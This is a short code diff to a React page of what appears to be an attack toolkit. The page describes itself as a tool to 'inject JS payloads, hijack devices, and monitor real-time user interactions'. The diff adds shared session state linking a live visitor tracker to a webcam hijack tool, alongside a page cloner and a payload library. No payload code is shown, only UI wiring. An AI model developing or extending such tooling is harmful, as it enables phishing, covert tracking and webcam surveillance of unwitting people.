@@ -2,7 +2,7 @@
 'use client';
 
 import { useState } from 'react';
-import { LiveTracker } from '@/components/live-tracker';
+import { LiveTracker, type TrackedEvent } from '@/components/live-tracker';
 import { AdvancedPageCloner } from '@/components/advanced-page-cloner';
 import { JavaScriptLibrary, type JsPayload } from '@/components/javascript-library';
 import { Separator } from '@/components/ui/separator';
@@ -10,6 +10,8 @@ import { WebcamHijackTool } from '@/components/webcam-hijack-tool';
 
 export default function LiveTrackerPage() {
   const [selectedPayload, setSelectedPayload] = useState<JsPayload | null>(null);
+  const [sessions, setSessions] = useState<Map<string, TrackedEvent[]>>(new Map());
+  const [selectedSessionId, setSelectedSessionId] = useState<string | null>(null);
 
   const handleSelectPayload = (payload: JsPayload) => {
     setSelectedPayload(payload);
@@ -22,13 +24,22 @@ export default function LiveTrackerPage() {
         <p className="text-muted-foreground">Inject JS payloads, hijack devices, and monitor real-time user interactions.</p>
       </div>
 
-      <WebcamHijackTool />
-      <Separator className="my-4" />
       <AdvancedPageCloner selectedPayload={selectedPayload}/>
       <Separator className="my-4" />
-      <LiveTracker />
+      <LiveTracker 
+        sessions={sessions}
+        setSessions={setSessions}
+        selectedSessionId={selectedSessionId}
+        setSelectedSessionId={setSelectedSessionId}
+      />
       <Separator className="my-4" />
       <JavaScriptLibrary onSelectPayload={handleSelectPayload}/>
+      <Separator className="my-4" />
+      <WebcamHijackTool 
+        sessions={sessions} 
+        selectedSessionId={selectedSessionId}
+        setSelectedSessionId={setSelectedSessionId}
+      />
 
     </div>
   );
